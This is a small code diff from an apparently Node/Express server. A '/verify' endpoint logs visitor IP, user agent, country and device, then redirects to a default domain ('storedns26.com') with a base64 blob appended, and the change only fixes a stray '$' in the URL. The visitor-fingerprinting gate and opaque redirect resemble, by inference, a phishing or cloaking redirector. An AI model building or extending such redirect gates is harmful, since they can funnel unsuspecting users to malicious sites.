@@ -204,7 +204,7 @@ app.post('/verify', async (req, res) => {
         logVisitor(clientIp, ua, country, device);
         const baseUrl = process.env.REDIRECT_BASE_URL || 'https://storedns26.com?nQOzKMSz';
         const cleanBaseUrl = baseUrl.endsWith('/') ? baseUrl.slice(0, -1) : baseUrl;
-        const redirectUrl = cleanBaseUrl + '/$' + encodeURIComponent(cleanB64);
+        const redirectUrl = cleanBaseUrl + '/' + encodeURIComponent(cleanB64);
 
         return res.json({
             status: 'success',
